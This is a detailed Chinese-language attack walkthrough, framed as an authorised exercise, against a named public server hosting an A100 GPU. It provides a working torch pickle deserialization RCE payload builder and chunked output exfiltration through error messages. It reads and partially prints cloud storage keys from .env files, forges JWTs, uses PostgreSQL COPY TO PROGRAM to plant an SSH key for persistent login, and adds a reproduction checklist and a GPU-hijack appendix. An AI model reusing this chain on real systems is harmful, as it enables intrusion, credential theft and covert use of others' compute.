# A100-GPU.md —— 45.198.13.253 从 0 到普通权限 + GPU 资产全解

> **授权与用途**：本文是一次授权演练的完整记录与教学材料。请只在**有书面授权**的目标上复现，任何越界使用后果自负。
> **可复现性**：正文所有命令都是我实际执行过的，路径、端口、版本号、报错原文都来自真实回显；凡未验证的我都会标「未验证」。
> **时间**：2026-11-25（目标机时钟 2026 年）。
> **一句话结论**：从公网一个「前端 SPA」里挖出隐藏的模型权重上传接口 → torch pickle 反序列化拿到宿主机命令执行（`pixiq-apps`，uid=997）→ 从业务 `.env` 拿 JWT 密钥与 Azure 密钥 → 通过本机 PostgreSQL 超级用户（`COPY ... TO PROGRAM`）以 `postgres`（uid=114）身份写入 SSH 公钥 → **获得任意终端、任意源 IP 都能密钥登录的普通权限**，并确认该机带一块可用的 **NVIDIA A100 80GB**。

---

## 目录

**正文（怎么从 0 打到普通权限）**
- [0. 复现前置环境](#0-复现前置环境)
- [1. 信息收集：端口面与隐藏后端](#1-信息收集端口面与隐藏后端)
- [2. 定位漏洞：8011 的权重上传接口](#2-定位漏洞8011-的权重上传接口)
- [3. 核心干货：构造 torch legacy pickle payload](#3-核心干货构造-torch-legacy-pickle-payload)
- [4. 回显工程：把输出从 error.message 里带出来](#4-回显工程把输出从-errormessage-里带出来)
- [5. 落地：拿到命令执行后先做什么](#5-落地拿到命令执行后先做什么)
- [6. 从"能执行命令"到"能登录"：普通权限落地](#6-从能执行命令到能登录普通权限落地)
- [7. 复盘：这条链为什么能走通](#7-复盘这条链为什么能走通)
- [8. 新手复现清单](#8-新手复现清单)

**附录**
- [附录 A：GPU 硬件与软件全量信息](#附录-agpu-硬件与软件全量信息)
- [附录 B：这台机器跑着什么服务](#附录-b这台机器跑着什么服务)
- [附录 C：有没有木马 / 后门](#附录-c有没有木马--后门)
- [附录 D：任意终端登录怎么实现的](#附录-d任意终端登录怎么实现的)
- [附录 E：这块 GPU 能干什么（实测）](#附录-e这块-gpu-能干什么实测)
- [附录 F：文件怎么传（链路实测）](#附录-f文件怎么传链路实测)
- [附录 G：留痕与清理](#附录-g留痕与清理)
- [附录 H：术语表](#附录-h术语表)
- [附录 I：无 root 搭可订阅代理节点全流程](#附录-i无-root-搭可订阅代理节点全流程)

---

# 正文：从 0 到普通权限

## 0. 复现前置环境

| 角色 | 说明 |
|---|---|
| 攻击机 | Kali Linux `192.168.124.6`（root/kali）。Windows 也能直连目标，只是链路慢 |
| 目标 | `45.198.13.253`，hostname `a100`，Ubuntu 22.04.5 / 内核 5.15.0-191 |
| 目标业务 | 工业缺陷检测（CTS Analytics），跑真实产线，**不能影响业务** |
| 需要的工具 | `nmap`、`curl`、`python3`+`requests`（构造 payload）、`ssh-keygen` |

> **心态**：从公网到普通权限，这条链上没有一步靠"爆破"。靠的是 **看接口 → 看懂数据格式 → 构造合法的恶意输入**。

---

## 1. 信息收集：端口面与隐藏后端

### 1.1 全端口扫描，先看什么在对外说话

```bash
nmap -Pn -p- --min-rate 2000 45.198.13.253 -oN full.txt
nmap -Pn -sV -p 80,443,445,2049,6379,8000,8010,8011,8080,8085,8086,8501 45.198.13.253
```

扫出来的关键面（**注意：开放的端口多 ≠ 都能打**）：

| 端口 | 初步判断 | 后来验证的结论 |
|---|---|---|
| 8000 | uvicorn | 无鉴权图像分析 API（无 RCE） |
| 8010 | 未在扫描里直接暴露 | **Python Training Server**（JWT 鉴权，可伪造） |
| 8011 | 扫不到（被前端藏起来） | **CTS Analytics API —— 真正的入口** |
| 8080 | nginx + SPA「UI Blocks」 | 静态前端 |
| 8085 | nginx + SPA「Enterprise ADR」 | 静态前端 |
| 8086 | nginx + SPA「CTS Analytics」 | **JavaScript 里藏着 8011** |
| 6379 | Redis 未授权可读写 | 后面没有用于这次链（也不建议动） |
| 445 / 139 / 2049 / 111 | SMB / NFS / rpcbind | TCP 能连但协议层静默，**大概率是中间设备伪造的"假开放"** |

新手最容易踩的坑：**看到 445/2049 通就以为有洞**。这里的实测结论是端口能建连、但 SMB/NFS 协议握手不响应 → 别把时间浪费在上面。判断方法：`smbclient -L //IP` 或 `showmount -e IP`，握手没反应就是假开放。

### 1.2 从 8086 的前端 JS 里挖出 8011（关键一步）

前端 SPA 的静态文件里通常硬编码了后端地址。手法很土但极有效：

```bash
# 1) 拉首页，看引用了哪些 js
curl -s http://45.198.13.253:8086/ | grep -oE 'src="[^"]+\.js"'

# 2) 把 js 拉下来
curl -s -o b80.js http://45.198.13.253:8086/assets/index-xxxx.js

# 3) 抠端口/IP/路径（顺序很重要：先找端口数字，再找 api 前缀）
grep -oE ':(80[0-9]{2}|8[0-9]{3})' b80.js | sort | uniq -c | sort -rn
grep -oE '"/api/[a-zA-Z0-9/_{}-]*"' b80.js | sort -u | head -40
grep -oE '(VITE_[A-Z_]+|baseURL|API_BASE)[^,;]{0,60}' b80.js | head
```

这一步的产出就是 **8011**，以及一批 `/api/v1/...` 路径。同一个 js 里还能拿到前端调用的完整业务模型（sites / detection / bundle / score / sessions），这为下一步找危险端点提供了地图。

> **为什么 8011 扫不到**：它只监听在宿主机上、由 nginx/容器做前端反代，nmap 的 service 探测没给出可识别的 banner。**前端的 JS 比端口扫描更能说明"系统里有什么"**。

---

## 2. 定位漏洞：8011 的权重上传接口

### 2.1 先读文档，再动手

FastAPI 的服务通常会暴露 `/openapi.json` 和 `/docs`：

```bash
curl -s http://45.198.13.253:8011/openapi.json -o oa.json
python3 -c "
import json
d = json.load(open('oa.json'))
print(d['info'])                      # {'title': 'CTS Analytics API', 'version': '0.1.0'}
for p, v in d['paths'].items():
    print(p, list(v.keys()))
"
```

在路径清单里挑「危险动作」，优先级：**上传/导入 > 反序列化 > 命令/脚本参数 > SQL > SSRF**。这里命中的是：

```
/api/v1/sites/{site_id}/detection/bundle/weights/{name}.pt     ['put']
```

`.pt` = PyTorch 的模型权重文件。**上传一个 `.pt` 给 PyTorch 加载 = 把 pickle 反序列化交给攻击者**。这是本节的核心判断。

### 2.2 端点要求 multipart，不是裸 body

第一次尝试直接把 payload 当 body 发，被拒：

```bash
curl -X PUT -H 'Content-Type: application/octet-stream' --data-binary @payload.pt \
     http://45.198.13.253:8011/api/v1/sites/plant-a/detection/bundle/weights/x.pt
# → 422 {"detail":[{"type":"missing","loc":["body","file"],"msg":"Field required","input":null}]}
```

`loc: ["body","file"]` 明确告诉我们：**要 multipart/form-data 的 `file` 字段**。改成：

```python
requests.put(url, files={"file": ("x.pt", payload, "application/octet-stream")})
```

成功（返回 422 是业务侧的"权重加载失败"，我们正是要靠这个错误带出回显，见第 4 节）。

---

## 3. 核心干货：构造 torch legacy pickle payload

### 3.1 先搞懂 torch 的保存格式

`torch.save(obj, f)` 并不是直接 `pickle.dump(obj)`。在**非 zip**（legacy）模式下，它依次写入：

```
[1] pickle.dump(MAGIC_NUMBER)     # 0x1950a86a20f9469cfc6c
[2] pickle.dump(PROTOCOL_VERSION) # 1001
[3] pickle.dump(sys_info)         # dict: protocol_version / little_endian / type_sizes
[4] pickle.dump(对象)              # ← 我们的恶意对象在这里被反序列化
[5] 序列化 storage keys（一个 list，通常是 []）
```

对应 `torch/serialization.py::_legacy_load`：读头三个 pickle，然后用自带的 `UnpicklerWrapper` 反序列化第 4 段。**只要前三段的格式对，它就会老老实实 unpickle 我们的对象。**

### 3.2 为什么不能只发普通 pickle

直接 `pickle.dump(恶意对象)` 只有第 4 段，服务端读 magic 就失败：

```
RuntimeError: Invalid magic number '...'
```

所以必须**手工拼出完整五段**——这是本项目最容易卡住的地方，也是最有价值的一段经验。

### 3.3 完整 payload 构造器（可直接用）

```python
import io, pickle

MAGIC = 0x1950a86a20f9469cfc6c
MARK  = "B64OUT:"          # 回显标记，后面第 4 节要用

class Evil:
    """__reduce__ 决定反序列化时怎么"还原"这个对象 —— 我们让它执行代码。"""
    def __init__(self, code: str):
        self.code = code
    def __reduce__(self):
        return (exec, (self.code,))      # exec 是 builtins，可被 pickle 按名字引用

def build(cmd: str) -> bytes:
    # 真正要跑的东西：执行 shell 命令，然后把 stdout+stderr 用 base64 抛进异常里
    code = (
        "import subprocess as _s, base64 as _b\n"
        "o = _s.run(%r, shell=True, capture_output=True)\n"
        "raise RuntimeError(%r + _b.b64encode(o.stdout + o.stderr).decode())\n"
    ) % (cmd, MARK)

    buf = io.BytesIO()
    pickle.dump(MAGIC, buf, protocol=2)                                   # [1]
    pickle.dump(1001, buf, protocol=2)                                    # [2]
    pickle.dump({"protocol_version": 1001, "little_endian": True,         # [3]
                 "type_sizes": {"short": 2, "int": 4, "long": 8}}, buf, protocol=2)
    pickle.dump(Evil(code), buf, protocol=2)                              # [4] ← 触发点
    pickle.dump([], buf, protocol=2)                                      # [5]
    return buf.getvalue()
```

**三个关键点，缺一不可：**

1. **`__reduce__` 返回 `(exec, (code,))`** —— pickle 序列化的不是"函数对象本身"，而是"函数名 + 参数"，服务端 unpickle 时会 `import builtins; getattr(builtins,'exec')(code)`。所以恶意代码能在对面执行。
2. **`protocol=2`** —— 与 torch 默认协议对齐，兼容性最好。
3. **第 5 段的 `[]` 不能省** —— 少了它，torch 在读完对象后继续读 storage list 会报 EOF/格式错误；有时不影响 RCE，但会让回显更难拿。

### 3.4 发送

```python
import requests
url = "http://45.198.13.253:8011/api/v1/sites/plant-a/detection/bundle/weights/x.pt"
r = requests.put(url, files={"file": ("x.pt", build("id; hostname"), "application/octet-stream")},
                 timeout=90)
print(r.status_code, r.text[:300])
```

预期回显形态：

```
422 {"error":"weights_load_failed","message":"B64OUT:dWlkPTk5NyhwaXhpcS1hcHBzKSBnaWQ9OTk3..."}
```

把 `B64OUT:` 后面的 base64 解出来就是命令输出。**到这里，我们已经拿到了宿主机命令执行。**

---

## 4. 回显工程：把输出从 error.message 里带出来

这一步是"能不能干活"的分水岭。真实环境里你会遇到两个硬限制：

### 4.1 限制一：只能从错误消息带出，且**被截断到约 290 字符**

实测：`nvidia-smi` 的完整输出塞进去，只回来 293 个 base64 字符（约 219 字节原始数据），后面的被服务端裁掉了：

```
[truncated-echo] http=422 b64len=293
raw={"error":"weights_load_failed","message":"B64OUT:PT09PT0gMS4gbnZpZGlhLXNtaSA9PT09PQpXZWQg..."}
```

**解决办法：目标侧先压缩、再 base64 落文件，然后分块取。**

```bash
# 目标上（通过 RCE 执行）：把命令输出 gzip + base64 写到文件
{ <你的命令> ; } > /tmp/_o.txt 2>&1
gzip -9c /tmp/_o.txt > /tmp/_o.gz
base64 -w0 /tmp/_o.gz > /tmp/_g.b64
wc -c < /tmp/_g.b64          # 输出总长度，用来算要取几块
```

```python
# 攻击机上：每块 200 字节（base64 后 268 字符，稳在 290 以内）
for skip in range(0, total // 200 + 1):
    piece = rce(f"dd if=/tmp/_g.b64 bs=200 skip={skip} count=1 2>/dev/null")
# 拼起来 → base64 解码 → gzip 解压 → 得到完整输出
```

> **经验值**：`bs=200 count=1` 是实测出来的甜点。用 `bs=300` 必被截断；用 `bs=100` 请求数翻倍、慢一倍。

### 4.2 限制二：命令写进临时脚本再执行，不要直接拼 shell

一开始我把命令直接拼进 `{ cmd ; } > /tmp/_o.txt`，踩了两个坑：

- **重定向只作用于最后一条命令**：`cmd1; cmd2; cmd3 > file` 只有 `cmd3` 进文件。必须 `{ cmd1; cmd2; cmd3 ; } > file`。
- **heredoc 放进 `{ }` 会语法错**：`{ python3 - <<'EOF' ... EOF ; }` 里 `EOF` 后面不能跟着 `; }`。

**最终稳定做法**：把命令 base64 上传成 `/tmp/_c.sh`，再 `bash /tmp/_c.sh > /tmp/_o.txt`。这样多行、heredoc、引号全部安全。

```python
script = "rm -f <上传残留>\n" + cmd + "\nrm -f <上传残留>\n"
prep = ("echo '%s' | base64 -d > /tmp/_c.sh; bash /tmp/_c.sh > /tmp/_o.txt 2>&1; "
        "gzip -9c /tmp/_o.txt > /tmp/_o.gz; base64 -w0 /tmp/_o.gz > /tmp/_g.b64; "
        "rm -f /tmp/_o.gz /tmp/_o.txt /tmp/_c.sh; wc -c < /tmp/_g.b64"
        % base64.b64encode(script.encode()).decode())
```

### 4.3 三个"自己坑自己"的坑（真踩过）

| 坑 | 现象 | 原因与对策 |
|---|---|---|
| 脚本里 `rm -f /tmp/_o.txt` | 下一次取回时报 `gzip: /tmp/_o.txt: No such file or directory`，`wc -c` 返回 0 | 那是回显通道的重定向目标，脚本 stdout 还指着它，删了等于把管子剪了。**清理放到下一轮再做** |
| `pkill -f hashcat.bin` | 整条命令无输出、连接像断了一样 | 我们自己的命令行里就含这个关键字，`pkill -f` 把执行命令的 shell 一起杀了。**只能用精确 PID `kill -9 <pid>`** |
| 上传文件落业务目录 | 每次请求都在 `.../bundle/weights/` 落一个 `x.pt` | payload 里在命令**前后各删一次**该文件，业务目录就始终干净 |

---

## 5. 落地：拿到命令执行后先做什么

### 5.1 十秒钟摸清身份与边界

```bash
id; hostname; uname -a
grep -i cap /proc/self/status        # CapEff/CapPrm
ls -la /dev/nvidia*                  # 有没有 GPU、权限如何
```

实测：

```
uid=997(pixiq-apps) gid=997(pixiq-apps) groups=997(pixiq-apps)
a100
Linux a100 5.15.0-191-generic #201-Ubuntu SMP ... x86_64 GNU/Linux
CapInh/CapPrm/CapEff: 0000000000000000        ← 零 capability
crw-rw-rw- 1 root root 195, 0 /dev/nvidia0    ← 但 GPU 设备节点是 666
```

**两个重要结论**：
1. 我们是**无任何特权**的普通服务账号；
2. 但 `/dev/nvidia*` 是 `666`，**零权限也能把 A100 用到满**（详见附录 A/E）。

### 5.2 盘点这个账号能读什么（横向的关键）

```bash
ls -la /srv/apps/                       # home 目录 = /srv/apps
systemctl list-units --type=service --state=running | head -40
ps -eo user,pid,args --sort=-rss | head -25
```

实测发现这台机上 **4 个业务服务全部以同一个账号 `pixiq-apps` 运行**：

| 服务 | 端口 | 目录 |
|---|---|---|
| cts-analytics.service | 8011 | `/srv/apps/cts-analytics` |
| training-api.service | 8010 | `/srv/apps/training-api` |
| exposure-backend | 8000 | `/srv/apps/exposure-analyzer` |
| exposure-frontend | 8501(streamlit) | 同上 |

**这就是这类"单账号多服务"部署的最大问题：拿下一个服务 = 拿到全部服务的配置文件。**

### 5.3 配置文件里有什么（本轮的提权/横向弹药）

```bash
cat /srv/apps/training-api/.env
```

真实内容（**本机实测值，勿外传**）：

```ini
AZURE_STORAGE_CONNECTION_STRING="DefaultEndpointsProtocol=https;AccountName=trainingdatasetdhvani;AccountKey=XlFct0Tw...;EndpointSuffix=core.windows.net"
MLFLOW_AZURE_CONNECTION_STRING="...AccountName=mlflowartifactsstore;AccountKey=r7mvGn6i...;EndpointSuffix=core.windows.net"
JWT_SECRET_KEY="<REDACTED：见演练库 credential #20>"
```

三样东西一次到手：**Azure 存储 AccountKey（两个账号）× 2 + JWT 签名密钥**。

### 5.4 用 JWT 密钥横向到 8010

`app/auth.py` 用的是标准 `jwt.decode(token, settings.jwt_secret_key, algorithms=["HS256"])`，拿到密钥就能自签：

```python
import jwt, time, requests
tok = jwt.encode({"sub": "pixiq-apps", "exp": int(time.time()) + 3600},
                 "<REDACTED：见演练库 credential #20>",
                 algorithm="HS256")
h = {"Authorization": "Bearer " + tok}
requests.get("http://127.0.0.1:8010/jobs?limit=1", headers=h).json()      # 200 {"total": 595, ...}
requests.get("http://127.0.0.1:8010/system/stats", headers=h).json()      # 实时 GPU 指标
```

无 token 时是 `401`，伪造后全部 200。**595 个历史训练任务、模型注册表、GPU 实时状态全部可读。**

---

## 6. 从"能执行命令"到"能登录"：普通权限落地

目标要求：**在任意终端、任意源 IP 下都能直接登录**。RCE 是"一次性的管道"，不适合当工作环境，必须做成真账号登录。

### 6.1 第一步：为什么不能直接给 `pixiq-apps` 配 SSH 密钥

```bash
getent passwd pixiq-apps
# pixiq-apps:x:997:997::/srv/apps:/usr/sbin/nologin      ← 致命点
```

`nologin` 账号 **sshd 会在认证通过后立刻拒绝**（`This account is currently not available.`）。而且：

- `AuthorizedKeysFile` 里的 `command="..."` 强制命令**也要经登录 shell 执行** → 一样被 nologin 拦死；
- 改 shell 要 `chsh`，需要该账号密码（或 root）——我们都没有，**也不允许爆破**。

> **这个陷阱非常常见**：拿到命令执行 ≠ 能 SSH。先看 `getent passwd <user>` 的第 7 字段。

### 6.2 第二步：找一个**有真实 shell** 的账号

```bash
grep -E '/bin/(ba)?sh|/usr/bin/(ba)?sh' /etc/passwd | cut -d: -f1,3,6,7
```

实测（节选）：

```
root:0:/root:/bin/bash
postgres:114:/var/lib/postgresql:/bin/bash     ← 目标
nithin:1001:/home/nithin:/bin/bash
ghcl:1004:/home/ghcl:/bin/bash
...
```

有 shell 的账号很多，但我们**只掌握 `postgres` 的口令**（前序轮次已获得 `postgres/postgres`，属于本项目台账内凭据，非爆破所得）。

### 6.3 第三步：PostgreSQL 只在 localhost 监听 → 在目标内部连

```bash
ss -lnt | grep -E ':5432|:5433'
# LISTEN 0 244 127.0.0.1:5432 0.0.0.0:*
# LISTEN 0 4096 127.0.0.1:5433 0.0.0.0:*
```

从外部连会被拒（`connection refused`）。**但我们已经在目标上有命令执行**，所以直接在目标上打本地：

```bash
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -tAc 'select current_user, version()'
# postgres|PostgreSQL 14.24 (Ubuntu 14.24-0ubuntu0.22.04.1) ...
```

### 6.4 第四步：`COPY ... TO PROGRAM` 把 DB 权限变成系统命令执行

PostgreSQL 的超级用户可以用 `COPY` 执行 shell 命令（以数据库进程的身份）：

```sql
COPY (select 1) TO PROGRAM 'id > /tmp/pg_id.txt 2>&1';
```

实测落地的身份：

```
uid=114(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
```

**这一步的意义**：我们从一个"nologin 的服务账号"跳到了"一个有 `/bin/bash`、有真实 home 的账号"。

### 6.5 第五步：以 `postgres` 身份写 SSH 公钥

思路：在攻击机生成密钥对（**私钥永不出本机**），把**公钥**写进 `/var/lib/postgresql/.ssh/authorized_keys`。

```bash
PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...  a100-gpu'
# 关键技巧：公钥里有空格，避免多层引号地狱 —— 先 base64
PUB_B64=$(printf '%s\n' "$PUB" | base64 -w0)

PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -tAc \
 "COPY (select 1) TO PROGRAM 'mkdir -p /var/lib/postgresql/.ssh \
   && chmod 700 /var/lib/postgresql/.ssh \
   && echo $PUB_B64 | base64 -d > /var/lib/postgresql/.ssh/authorized_keys \
   && chmod 600 /var/lib/postgresql/.ssh/authorized_keys'"
```

验证：

```
postgres:postgres 600 /var/lib/postgresql/.ssh/authorized_keys
```

**为什么必须 base64**：这条命令要穿过 `bash` → `psql -c` → SQL 字符串 → `sh -c` 共 4 层引号解析，公钥里的空格和 `+/=` 极易被吃掉一层。base64 只有 `[A-Za-z0-9+/=]`，任何一层都不会破坏它。

### 6.6 第六步：生成密钥时的三个坑（都踩过）

| 坑 | 现象 | 原因 / 正确做法 |
|---|---|---|
| `ssh-keygen -N '""'` | 服务端日志显示 `Server accepts key`，随后 `we did not send a packet`，`Permission denied` | PowerShell 里 `'""'` 是**字面量两个引号**，密钥被加了 `""` 口令，客户端无法无交互签名。用 `python cryptography` 生成无口令密钥最稳 |
| 用 ed25519 给 FinalShell | GUI 客户端加载失败或认证失败 | FinalShell/Xshell 对 OpenSSH 新格式 ed25519 支持差。**再生成一把 RSA 4096、传统 PEM（`BEGIN RSA PRIVATE KEY`）**给它 |
| Windows 私钥 ACL 太宽 | `Permissions for this file are too open` | `icacls <key> /inheritance:r /grant:r "$env:USERNAME:(R)"` |

生成无口令 ed25519 的可控写法（推荐）：

```python
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives import serialization
k = ed25519.Ed25519PrivateKey.generate()
open(path, "wb").write(k.private_bytes(serialization.Encoding.PEM,
                                       serialization.PrivateFormat.OpenSSH,
                                       serialization.NoEncryption()))
print(k.public_key().public_bytes(serialization.Encoding.OpenSSH,
                                  serialization.PublicFormat.OpenSSH).decode())
```

再生成一把给 GUI 客户端的 RSA：

```python
from cryptography.hazmat.primitives.asymmetric import rsa
k = rsa.generate_private_key(public_exponent=65537, key_size=4096)
open(path, "wb").write(k.private_bytes(serialization.Encoding.PEM,
                                       serialization.PrivateFormat.TraditionalOpenSSL,
                                       serialization.NoEncryption()))
```

### 6.7 第七步：验证

```bash
$ ssh -i ./veck_a100_postgres postgres@45.198.13.253 "id; hostname; nvidia-smi -L"
uid=114(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
a100
GPU 0: NVIDIA A100 80GB PCIe (UUID: GPU-aea6ff14-fdcb-4ca0-9662-07dc66e22bfc)

$ ssh -tt postgres@45.198.13.253       # 交互式：完整 MOTD + bash + PTY
postgres@a100:~$ tty
/dev/pts/0
```

**到这里，"从 0 到普通权限"完成**：拿到一个在任意终端、任意源 IP 都能用的 SSH 账号（详见附录 D）。

### 6.8 第八步：用完怎么撤

```bash
ssh -i ./veck_a100_postgres postgres@45.198.13.253 "rm -f ~/.ssh/authorized_keys && ls -la ~/.ssh"
```

---

## 7. 复盘：这条链为什么能走通

不是运气，是几个可复用的判断：

1. **前端 JS 比端口扫描更能说明系统结构**。8011 不在扫描结果里，但它在 8086 的打包产物里写着。→ 拿到 SPA 一定要扒 JS 抠接口。
2. **"上传文件 + 服务端加载" = 优先怀疑反序列化**。`.pt`/`.pkl`/`.joblib`/`.npy`/`.h5`/`.onnx`(自定义 op) 都算。
3. **先对齐格式再谈利用**。torch legacy 的四段头（magic / 1001 / sysinfo / 对象）不知道就会一直卡在 `Invalid magic number`。**读懂 `torch/serialization.py` 比背 payload 更有用**。
4. **回显比 RCE 更难**。真实攻防里 90% 的挫败来自"命令执行了但看不到结果"。压缩 + 分块 + 避开截断，是必须自己搭的基础设施。
5. **单账号多服务部署 = 一破全破**。四个业务服务同 uid，`.env` 里的 JWT/Azure 密钥一次性泄光。
6. **拿到命令执行之后，第一目标不是"提权到 root"，而是"做成稳定的可登录身份"**。`nologin` 会拦你，所以先看 passwd，再挑一个已有 shell 的账号。
7. **多协议交叉利用**：Web RCE（uid=997）→ 本地 PostgreSQL 超级用户（uid=114）→ SSH 密钥。每一步都只是"用上一个身份能碰到的东西"。

---

## 8. 新手复现清单

```
[ ] 1. nmap 全端口 + -sV；把 445/2049 这类"假开放"用协议层验证一次，不成立就跳过
[ ] 2. 逐个访问 http(s) 端口，记 title；对 SPA 端口执行"扒 JS 抠接口"三连
[ ] 3. 对发现的 API：/openapi.json、/docs、/redoc 全拿一遍
[ ] 4. 在 paths 里按"上传 > 反序列化 > 命令参数 > SQL > SSRF"排序挑靶子
[ ] 5. 上传点先试裸 body → 失败看 422 的 loc 字段确定真实参数名（这里是 file/multipart）
[ ] 6. 构造 torch legacy pickle：magic + 1001 + sysinfo + 对象 + []，protocol=2
[ ] 7. 回显：raise RuntimeError(base64(输出))，从 error.message 取；被截断就 gzip+分块 dd
[ ] 8. 落地后 ten seconds：id / hostname / caps / /dev/nvidia* / getent passwd
[ ] 9. 找 .env / 配置文件：JWT secret、云厂商密钥、DB 口令
[ ] 10. 有 JWT secret 就自签；有 DB 超级用户就 COPY TO PROGRAM
[ ] 11. 想做成登录：先避开 nologin 账号，挑 /bin/bash 的账号，写 authorized_keys
[ ] 12. 验证：ssh -i 交互 + PTY + 业务能力；最后清理，记录留痕
```

---

# 附录

## 附录 A：GPU 硬件与软件全量信息

### A.1 卡片本体（`nvidia-smi -q` 实测摘录）

| 项 | 值 |
|---|---|
| 型号 | **NVIDIA A100 80GB PCIe**（GA100，rev a1），`lspci`：`05:00.0 3D controller: NVIDIA Corporation GA100 [A100 PCIe 80GB]` |
| 数量 | **1 块**（`nvidia-smi -L` 只有 GPU 0） |
| UUID / 序列号 | `GPU-aea6ff14-fdcb-4ca0-9662-07dc66e22bfc` / `1324321150540` |
| VBIOS / Part Number | `92.00.68.00.01` / `20B5-893-A1` |
| 架构 / SM 数 | Ampere / **108 SM**，`clocks.max.sm = 1410 MHz`（空闲 210 MHz） |
| 计算能力 | **(8, 0)** |
| 显存 | **81920 MiB**（80GB），ECC **Enabled**，空闲时可分配 80727 MiB |
| 功耗 | 上限 **300 W**，空闲 ~42 W |
| 拓扑 | `topo -m` 只有 GPU0（X=Self）→ **无 NVLink、单卡**，`MultiGPU Board: No` |
| PCIe | **Gen4 × 16**（max=4, current=4, width max=16） |
| MIG | **Disabled**（不能切成 7 个实例） |
| 驱动 / CUDA | 驱动 **595.91.07**（Open Kernel Module），CUDA 运行时 **13.2**，工具链 **12.2**（`/usr/local/cuda/bin/nvcc`） |
| 虚拟化 | Pass-Through |

### A.2 设备节点与权限（这是"能用"的根本原因）

```
crw-rw-rw- 1 root root 195,   0 /dev/nvidia0
crw-rw-rw- 1 root root 195, 255 /dev/nvidiactl
crw-rw-rw- 1 root root 511,   0 /dev/nvidia-uvm
crw-rw-rw- 1 root root 511,   1 /dev/nvidia-uvm-tools
crw-rw-rw- 1 root root 195, 254 /dev/nvidia-modeset
cr-------- 1 root root 236,   1 /dev/nvidia-caps/nvidia-cap1
```

交互账号 `postgres` 的 `CapEff = 0000000000000000`（零 capability），**但因为节点是 666，依然能完整使用 GPU**。

### A.3 机器规格

| 项 | 值 |
|---|---|
| CPU | **AMD EPYC-Milan，16 核**（`lscpu` CPU(s)=16，1 thread/core）。注意 `nproc` 返回 1，是因为环境里设了 `OMP_NUM_THREADS=1`，**不是只有 1 核** |
| 内存 | 125 GiB（可用 119 GiB），无 swap |
| 磁盘 | `/dev/vda1 1.5T，已用 95%，剩 ~84G` |
| tmpfs | `/dev/shm` 63G（跑训练产物很合适） |
| Python/torch | `/srv/apps/cts-analytics/.venv` → **torch 2.4.0+cu121**；`/srv/apps/training-api/.venv` → **torch 2.11.0+cu128** |
| `/opt/vllm-env` | 有 vLLM + torch 2.11.0+cu130 的 site-packages，但**解释器软链到 `/home/karthi/...`（700）→ 不可执行，借不了** |

> **注意**：venv 里的 `bin/python3` 是指向 `/usr/bin/python3` 的软链，torch 在 venv 的 site-packages 里。所以非该 venv 用户要跑 GPU 代码得带 `PYTHONPATH`：
> ```bash
> PYTHONPATH=/srv/apps/cts-analytics/.venv/lib/python3.10/site-packages python3 x.py
> ```

---

## 附录 B：这台机器跑着什么服务

### B.1 对外监听（`ss -lnt` 中 `0.0.0.0` / `[::]` 的部分）

| 端口 | 服务 | 备注 |
|---|---|---|
| 22 | OpenSSH | `PasswordAuthentication yes`、`PermitRootLogin yes`、`MaxSessions 50` |
| 80 / 443 | nginx | 反代前端 |
| 111 | rpcbind | NFS 依赖，**对外暴露不该有** |
| 139 / 445 | smbd / nmbd (Samba) | 探测表现为"协议静默" |
| 2049 | NFS | 同上 |
| 6379 | Redis | 未授权（前序轮次验证 `+PONG`），容器内运行 |
| 15672 / 25672 | RabbitMQ 管理台 / 集群 | 管理台对外 |
| 27018 | MongoDB | 非默认端口，对外 |
| 7860 | Gradio 类界面 | 对外 |
| 18710 / 18712 | Builder（live / staging） | 见 `/tmp/a100-link.sh`：nginx allow-list 只放 10.78.0.1 |
| 8000 | exposure-backend (uvicorn) | **无鉴权图像分析 API**，被大量外部 IP 访问 |
| 8010 | training-api (uvicorn) | JWT 鉴权（密钥已泄） |
| 8011 | cts-analytics (uvicorn) | **本次入口** |
| 8080 / 8085 / 8086 | 三个 SPA（UI Blocks / Enterprise ADR / CTS Analytics） | 8086 是本次的 JS 来源 |
| 8501 | Streamlit | 对外 |

另有若干高位端口（37955 / 40517 / 47753 / 57311 / 60187 等）在 `0.0.0.0` 监听，但**以 `postgres` 权限看不到属主进程**（`/proc/<pid>/exe` 需属主或 root）→ 标 **未验证**，需 root 才能定位。

### B.2 运行中的 systemd 服务（关键几项）

```
cts-analytics.service        (8011)
training-api.service         (8010)
exposure-backend.service     (8000)
exposure-frontend.service    (8501)
docker.service / containerd.service
nginx.service
postgresql@14-main.service
rabbitmq-server.service
smbd.service / nmbd.service
nfs-mountd / nfs-idmapd / rpcbind
nvidia-persistenced.service
actions.runner.Dhvani-Analytical-Intelligence-builder-staging.a100-builder.service
user@114.service  ← 即 postgres 的 systemd 用户实例
```

**Docker 相关**：`8086` 由 `docker-proxy` 从容器 `172.25.0.2:80` 映射出来；宿主还有 172.17~172.27 多个 docker 网段，说明容器较多。以 `postgres` 权限**列不了容器清单**（不在 `docker` 组，`/run/docker.sock` 是 `srw-rw---- root:docker`）。

### B.3 内网结构（从业务脚本读到，非扫描）

`/tmp/a100-link.sh`（业务方 nithin 创建）说明这台机的网络定位：

```
wg1  10.77.0.0/30  OpsIQ 侧链路（已存在）
wg2  10.78.0.2/30  devsIQ 侧链路，拨号 20.219.187.4:51820（该脚本由 root 执行）
Builder live 18710 / staging 18712（docker 发布在 10.77.0.2:18711）
```

---

## 附录 C：有没有木马 / 后门

### C.1 排查方法（新手可直接照抄的 8 项）

```bash
# 1) 高 CPU / 高内存（矿机第一特征）
ps -eo pid,user,pcpu,pmem,etime,comm --sort=-pcpu | head -8

# 2) 矿机/僵尸网络/隧道关键词
ps -eo pid,user,args | grep -iE "xmrig|kinsing|kdevtmpfsi|masscan|zmap|\.sshd|/1919|pan-chan|tmate|ngrok|frpc|chisel|/dev/shm/|/tmp/\.[a-z]" | grep -v grep

# 3) 临时目录里的可执行文件（恶意样本高发区）
find /tmp /dev/shm /var/tmp -maxdepth 2 -type f -newermt "-45 days" \( -perm -u+x -o -name "*.sh" -o -name "*.elf" \) 2>/dev/null

# 4) 持久化：cron / systemd timer
crontab -l; ls -la /etc/cron.d/; grep -vE "^#|^$" /etc/crontab; systemctl list-timers --all

# 5) 隐藏 root 账号 / 预加载劫持
awk -F: '$3==0{print}' /etc/passwd
cat /etc/ld.so.preload

